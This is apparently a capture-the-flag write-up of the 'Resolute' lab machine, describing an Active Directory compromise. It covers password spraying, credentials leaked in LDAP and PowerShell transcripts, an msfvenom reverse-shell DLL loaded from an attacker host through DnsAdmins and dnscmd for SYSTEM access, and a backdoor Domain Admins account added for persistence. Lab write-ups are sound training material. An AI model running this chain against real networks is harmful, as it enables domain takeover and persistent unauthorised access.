# Resolute (Medium)

A password left in an LDAP description field, PowerShell transcript logs leaking a second account, and a DnsAdmins group membership abused for SYSTEM-level DLL loading.

## Enumeration

```bash
nmap -sC -sV -Pn -p- <target>
```

```
53/tcp   open domain
88/tcp   open kerberos-sec  (Domain: megabank.local)
135/tcp  open msrpc
139/tcp  open netbios-ssn
389/tcp  open ldap
445/tcp  open microsoft-ds  Windows Server 2016 Standard
464/tcp  open kpasswd5?
593/tcp  open ncacn_http
636/tcp  open tcpwrapped
3268/tcp open ldap
3269/tcp open tcpwrapped
```

## Foothold — LDAP description field + password spray

```bash
ldapsearch -x -H ldap://<target> -b DC=megabank,DC=local > ldap.txt
grep description ldap.txt
```

One account's `description` attribute contained a plaintext password (redacted — `<REDACTED>`), apparently left by an administrator. After checking the lockout policy was disabled (`lockoutThreshold: 0`), that password was sprayed across the enumerated user list:

```bash
rpcclient -U '' -N <target>
rpcclient $> enumdomusers
crackmapexec smb <target> -u users -p '<REDACTED>'
```

A match was found for a different account than the one the password was attached to.

```bash
evil-winrm -i <target> -u <user> -p '<REDACTED>'
```
→ `user.txt` retrieved.

## PowerShell transcript credential leak

Forced directory listing (`dir -Force`) surfaced a `PSTranscripts` folder containing historical PowerShell session transcripts. One transcript recorded another account's credentials in plaintext (redacted), and that account was found (via `rpcclient enumdomgroups`) to belong to the **Contractors** group.

## Privilege Escalation — DnsAdmins → malicious DLL

```powershell
whoami /all
```

Showed membership in **DnsAdmins** — a well-documented AD privesc path, since the DNS service can be configured to load an arbitrary plugin DLL as `NT AUTHORITY\SYSTEM`.

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=9001 -f dll > rev.dll
impacket-smbserver resolute $(pwd)
nc -lvnp 9001
```

On the target (technique via [LOLBAS `dnscmd`](https://lolbas-project.github.io/#dnscmd)):

```cmd
dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\<attacker>\resolute\rev.dll
sc.exe stop dns
sc.exe start dns
```

Restarting the DNS service loads the malicious DLL as SYSTEM, giving a SYSTEM shell. `root.txt` retrieved; a persistence account was then added to Domain Admins for good measure:

```cmd
net user tom <REDACTED> /add
net group "Domain Admins" /add tom
```

## Takeaways

- Always grep LDAP dumps for `description`, `info`, `comment` — admins routinely leave passwords there.
- PowerShell transcription logging (if enabled) is a goldmine if directories aren't locked down — always check with `dir -Force`.
- DnsAdmins group membership is a direct-to-SYSTEM privesc via the `serverlevelplugindll` DNS server configuration option; restarting the `dns` service loads the attacker's DLL.
